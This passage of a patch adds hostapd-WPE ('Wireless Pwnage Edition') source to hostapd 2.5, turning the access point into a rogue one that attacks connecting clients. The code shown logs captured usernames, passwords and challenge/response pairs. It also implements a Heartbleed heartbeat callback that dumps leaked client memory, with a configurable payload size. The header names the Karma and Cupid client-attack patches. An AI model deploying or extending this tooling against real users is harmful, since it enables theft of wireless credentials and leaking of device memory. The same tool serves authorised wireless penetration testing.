++        wpe_log_file_and_stdout("\n");
++    }
++}
++
++void wpe_log_basic(char *type, const u8 *username, size_t username_len, const u8 *password, size_t password_len)  {
++    time_t nowtime;
++    int x;
++
++    nowtime = time(NULL);
++
++    wpe_log_file_and_stdout("\n\n%s: %s",type, ctime(&nowtime));
++    wpe_log_file_and_stdout("\t username:\t");
++    for (x=0; x<username_len; x++)
++        wpe_log_file_and_stdout("%c",username[x]);
++    wpe_log_file_and_stdout("\n");
++
++    wpe_log_file_and_stdout("\t password:\t");
++    for (x=0; x<password_len; x++)
++        wpe_log_file_and_stdout("%c",password[x]);
++    wpe_log_file_and_stdout("\n");
++}
++
++/*
++    Taken from asleap, who took from nmap, who took from tcpdump :) 
++*/
++void wpe_hexdump(unsigned char *bp, unsigned int length)
++{
++
++    /* stolen from tcpdump, then kludged extensively */
++
++    static const char asciify[] =
++        "................................ !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~.................................................................................................................................";
++
++    const unsigned short *sp;
++    const unsigned char *ap;
++    unsigned int i, j;
++    int nshorts, nshorts2;
++    int padding;
++
++    wpe_log_file_and_stdout("\n\t");
++    padding = 0;
++    sp = (unsigned short *)bp;
++    ap = (unsigned char *)bp;
++    nshorts = (unsigned int)length / sizeof(unsigned short);
++    nshorts2 = (unsigned int)length / sizeof(unsigned short);
++    i = 0;
++    j = 0;
++    while (1) {
++        while (--nshorts >= 0) {
++            wpe_log_file_and_stdout(" %04x", ntohs(*sp));
++            sp++;
++            if ((++i % 8) == 0)
++                break;
++        }
++        if (nshorts < 0) {
++            if ((length & 1) && (((i - 1) % 8) != 0)) {
++                wpe_log_file_and_stdout(" %02x  ", *(unsigned char *)sp);
++                padding++;
++            }
++            nshorts = (8 - (nshorts2 - nshorts));
++            while (--nshorts >= 0) {
++                wpe_log_file_and_stdout("     ");
++            }
++            if (!padding)
++                wpe_log_file_and_stdout("     ");
++        }
++        wpe_log_file_and_stdout("  ");
++
++        while (--nshorts2 >= 0) {
++            wpe_log_file_and_stdout("%c%c", asciify[*ap], asciify[*(ap + 1)]);
++            ap += 2;
++            if ((++j % 8) == 0) {
++                wpe_log_file_and_stdout("\n\t");
++                break;
++            }
++        }
++        if (nshorts2 < 0) {
++            if ((length & 1) && (((j - 1) % 8) != 0)) {
++                wpe_log_file_and_stdout("%c", asciify[*ap]);
++            }
++            break;
++        }
++    }
++    if ((length & 1) && (((i - 1) % 8) == 0)) {
++        wpe_log_file_and_stdout(" %02x", *(unsigned char *)sp);
++        wpe_log_file_and_stdout("                                       %c",
++               asciify[*ap]);
++    }
++    wpe_log_file_and_stdout("\n");
++}
++
++void wpe_hb_cb(int v_write_p, int v_version, int v_content_type, const void* v_buf, size_t v_len, SSL* v_ssl, void* v_arg) {
++    if (v_content_type == TLS1_RT_HEARTBEAT) {
++        wpe_log_file_and_stdout("\n\nHeartbleed Data:\n");
++        v_ssl->tlsext_hb_pending = 1;
++        wpe_hexdump((unsigned char *)v_buf, v_len);
++    } 
++}
++
++
++char *wpe_hb_clear() {
++    char *p;
++    // set payload size
++    p = &wpe_hb_msg[sizeof(wpe_hb_msg) - 3];
++    s2n(wpe_conf.wpe_hb_payload_size, p);
++
++    return wpe_hb_msg;
++}
++
+diff -rupN hostapd-2.5/src/wpe/wpe.h hostapd-2.5-wpe/src/wpe/wpe.h
+--- hostapd-2.5/src/wpe/wpe.h	1970-01-01 01:00:00.000000000 +0100
++++ hostapd-2.5-wpe/src/wpe/wpe.h	2015-10-25 16:52:26.349508655 +0100
+@@ -0,0 +1,50 @@
++/*
++    wpe.h - 
++        brad.antoniewicz@foundstone.com
++        Implements WPE (Wireless Pwnage Edition) functionality within 
++        hostapd.
++
++        WPE functionality focuses on targeting connecting users. At 
++        it's core it implements credential logging (originally 
++        implemented in FreeRADIUS-WPE), but also includes other patches
++        for other client attacks.
++
++            FreeRADIUS-WPE: https://github.com/brad-anton/freeradius-wpe
++            Karma patch: http://foofus.net/goons/jmk/tools/hostapd-1.0-karma.diff
++            Cupid patch: https://github.com/lgrangeia/cupid/blob/master/patch-hostapd
++*/
++#include <openssl/ssl.h>
++
++struct wpe_config {
++    char *wpe_logfile;
++    FILE *wpe_logfile_fp;
++    unsigned int wpe_enable_karma;
++    unsigned int wpe_enable_cupid;
++    unsigned int wpe_enable_return_success;
++    unsigned int wpe_hb_send_before_handshake:1;
++    unsigned int wpe_hb_send_before_appdata:1;
++    unsigned int wpe_hb_send_after_appdata:1;
++    unsigned int wpe_hb_payload_size;
++    unsigned int wpe_hb_num_tries;
++    unsigned int wpe_hb_num_repeats;
++};
++
++extern struct wpe_config wpe_conf;
++
++extern char wpe_hb_msg[];
++extern size_t wpe_hb_msg_len;
++
++//#define WPE_HB_MSG_LEN 8
++
++#define n2s(c,s)((s=(((unsigned int)(c[0]))<< 8)| \
++       (((unsigned int)(c[1]))    )),c+=2)
++
++#define s2n(s,c) ((c[0]=(unsigned char)(((s)>> 8)&0xff), \
++        c[1]=(unsigned char)(((s)    )&0xff)),c+=2)
++
++
++void wpe_log_file_and_stdout(char const *fmt, ...);
++void wpe_log_chalresp(char *type, const u8 *username, size_t username_len, const u8 *challenge, size_t challenge_len, const u8 *response, size_t response_len);
++void wpe_log_basic(char *type, const u8 *username, size_t username_len, const u8 *password, size_t password_len);
++void wpe_hb_cb(int v_write_p, int v_version, int v_content_type, const void* v_buf, size_t v_len, SSL* v_ssl, void* v_arg);
++char *wpe_hb_clear();
